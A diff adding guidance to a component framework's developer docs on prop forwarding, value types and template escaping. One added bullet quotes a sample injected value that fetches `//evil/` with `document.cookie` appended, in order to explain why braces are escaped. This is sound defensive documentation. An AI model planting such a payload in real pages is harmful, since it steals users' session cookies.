@@ -342,6 +342,71 @@ Pitfalls:
 - **Reserved/native attribute collisions:** forwarded props are real DOM attributes. A prop named `title` produces the native `title="..."` tooltip on the root. Prefer a component-specific non-native name such as `user-name` (Python `userName`, browser `pp.props.userName`) when native behavior is not intended.
 - `get_attributes(...)` omits empty strings. To pass a reactive boolean, prefer a pure expression such as `disabled="{isDisabled}"` rather than relying on a bare empty attribute to survive the Python bridge.
 
+### Every Prop A Template Reads Must Be Forwarded To The Root
+
+This is the most common cause of `hidden="{...}"`, `class="{...}"`, and value bindings silently failing inside a Caspian component.
+
+PulsePoint computes `pp.props` from the **rendered root element's attributes**, not from the Python signature. `get_attributes(defaults, overrides)` emits only the keys present in the two dictionaries it is given. A named Python parameter is consumed out of `**props`, so it is no longer in the passthrough dictionary — if it is not also listed in `defaults`, it never reaches the root, and `pp.props.<name>` is `undefined`.
+
+Nothing warns about this. The server renders, the component mounts, and every expression referencing the missing prop quietly evaluates against `undefined`.
+
+Broken — only `controlsVisible` reaches the browser:
+
+```python
+@component
+def PlayerControls(title="Movie", playing=None, volume=None, controlsVisible=None, **props):
+    attributes = get_attributes({"controlsVisible": controlsVisible}, props)
+```
+
+```html
+<!-- volume is undefined: `undefined === 0` and `undefined > 0` are both false, -->
+<!-- so both icons render and the toggle looks dead -->
+<x-volume hidden="{volume === 0}" />
+<x-volume-x hidden="{volume > 0}" />
+```
+
+Fixed — forward every prop the template references:
+
+```python
+attributes = get_attributes({
+    "title": title,
+    "playing": playing,
+    "volume": volume,
+    "controlsVisible": controlsVisible,
+}, props)
+```
+
+Boolean toggles hide this bug well: with `playing` undefined, `hidden="{playing}"` and `hidden="{!playing}"` still pick one branch, so the initial paint can look correct while never reacting to state changes.
+
+#### Forwarding Alone Is Not Enough: The Value-Type Contract
+
+Listing a prop fixes presence, not type. What `pp.props` receives depends on how the value reaches the root attribute:
+
+| Attribute on the rendered root | `typeof pp.props.x` | Value |
+| --- | --- | --- |
+| `volume="{vol}"` — an unevaluated brace expression | the real type | evaluated in the **parent** component's scope |
+| `volume="0"` — a literal, from a Python value | `"string"` | `"0"` |
+| `is-fullscreen="true"` — a literal | `"string"` | `"true"` (and `"false"` is also truthy) |
+| `bare-flag` — valueless attribute | `"boolean"` | `true` |
+| `class="..."` — a JS reserved word | `"undefined"` | dropped from `pp.props` entirely |
+| not present | `"undefined"` | — |
+
+Consequences to design around:
+
+- `volume === 0` is **false** when the value arrived as the literal string `"0"`. Strict comparisons only behave numerically when the parent passed a brace expression such as `volume="{vol}"`, which survives the Python render as literal text and is evaluated in parent scope by the browser. When a Python default or server-computed value is the source, compare loosely, coerce with `Number(...)`, or normalize in the component script.
+- Reserved words are stripped by the runtime, so `pp.props.class` never exists. Use `class_name`/`className` in Python for the DOM `class` attribute, and a non-reserved prop name when the script must read the value.
+- `get_attributes(...)` omits `None`, `False`, `""`, and empty collections. A prop listed with one of those values is still absent from `pp.props`, so `pp.props.playing` is `undefined` rather than `false`. Read booleans defensively (`!!pp.props.playing`) or default them when destructuring.
+- Forwarded props are real DOM attributes and camelCase becomes kebab-case, so `isFullscreen` renders as `is-fullscreen` and returns as `pp.props.isFullscreen`.
+
+#### Checklist
+
+For any Python component that accepts props, calls `get_attributes({...}, props)`, and has a `<script>` reading `pp.props`:
+
+1. List every variable the template's `{...}` expressions reference in the `get_attributes` defaults dictionary.
+2. Confirm `{{ attributes }}` is on the single root and `attributes=attributes` is passed into `html(...)`.
+3. For strict comparisons (`=== 0`, `=== "x"`), confirm the value arrives as a brace expression, or coerce it in the script.
+4. Avoid prop names that are JS reserved words or unintended native attributes (`title`, `class`, `for`).
+
 ### HTML Attribute Helper Contract
 
 `casp.html_attrs.get_attributes(defaults, overrides=None)` builds one Jinja-safe attribute string for a component root:
@@ -368,6 +433,9 @@ Rules for inline `html(...)`:
 - Pass data, labels, variants, current selection, counts, permissions, or callbacks as props instead of making child components reach back into route markup or duplicate parent state.
 - Component attributes are props regardless of the value type. Kebab-case names become camel-cased in `pp.props`, so callbacks may be authored as `on-open-change="{setOpen}"`, `open-change="{setOpen}"`, or `select-first="{selectFirst}"` according to the component API. The `on-` prefix is conventional, not required. Lowercase native DOM event attributes such as `onclick` and `oninput` remain events on the boundary element; use `on-click` only when the component API intentionally exposes an `onClick` prop.
 - Autoescaping is ON (Jinja default), so `{{ value }}` escapes HTML automatically and user text is safe without `| e`. The flip side: trusted HTML you want rendered as-is must be `Markup(...)` or piped through `| safe`.
+- Braces are escaped too, and for a reason HTML escaping does not cover. PulsePoint compiles the *rendered DOM*, turning any `{expr}` that parses as JavaScript into an evaluated expression. Braces are not HTML-special, so a stored value like `{fetch('//evil/'+document.cookie)}` would survive autoescape and then execute. The engine's Jinja `finalize` hook therefore encodes `{` and `}` as `&#123;`/`&#125;` on every non-`Markup` value, and the escaped entities render as literal braces.
+- `Markup` is the trust boundary for both escapes. `| safe`, `Markup(...)`, `get_attributes(...)`, `merge_classes(...)`, the `json`/`dump` filters, and `children` all return `Markup`, so framework-generated PulsePoint syntax such as `{twMerge(...)}` stays live. The rule for new helpers: one that *emits* PulsePoint syntax must return `Markup`; one that *formats user data* must not, or it re-opens the injection.
+- Consequence worth knowing: you cannot build a PulsePoint expression on the server by interpolating a plain string (`class="{{ some_expr }}"` renders inert). Author the expression in the template, or return `Markup` from the helper that produces it.
 - A `children` value is auto-marked safe (parity with `render_html(...)`), so `{{ children }}` renders nested component markup correctly without `| safe`.
 - Do not use a Python f-string for the markup. PulsePoint single braces `{ ... }` would collide with f-string interpolation. Use a plain triple-quoted string passed to `html(...)`.
 - Prefer `render_html(...)` with a same-name `.html` file when the markup is large or the `<script>` carries real logic. A long client script is a smell regardless of file shape; move heavy work into `@rpc()` actions or smaller composed components.
